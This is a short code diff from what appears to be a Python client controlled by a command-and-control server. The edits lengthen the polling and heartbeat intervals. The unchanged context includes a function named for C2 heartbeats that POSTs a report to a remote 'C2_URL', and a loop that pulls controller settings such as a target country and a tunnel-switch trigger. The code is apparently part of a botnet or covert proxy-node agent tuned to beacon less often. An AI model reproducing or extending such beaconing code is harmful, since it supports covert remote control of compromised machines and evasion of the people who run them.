@@ -172,7 +172,7 @@ def update_config_loop():
             check_for_updates()
             data = fetch_controller_config()
             if not data:
-                time.sleep(15)
+                time.sleep(300)
                 continue
             desired_country = str(data.get("0") or data.get("country") or "JP").upper()
             switch_trigger = int(data.get("switch_trigger", 0))
@@ -223,7 +223,7 @@ def update_config_loop():
                     last_switch_trigger = switch_trigger
         except Exception as e:
             print(f"[cfg] 拉取配置失败: {e}", flush=True)
-        time.sleep(15)
+        time.sleep(300)
 
 def c2_heartbeat_loop():
     global public_ip, PROXY_PORT, tun_main, tun_backup
@@ -248,7 +248,7 @@ def c2_heartbeat_loop():
             req = urllib.request.Request(f"{C2_URL}{C2_API_PREFIX}/report", data=payload, headers=get_c2_headers(), method='POST')
             urllib.request.urlopen(req, timeout=10)
         except Exception as e: pass
-        time.sleep(8)
+        time.sleep(90)
 
 def setup_env():
     CONFIG_DIR.mkdir(parents=True, exist_ok=True)
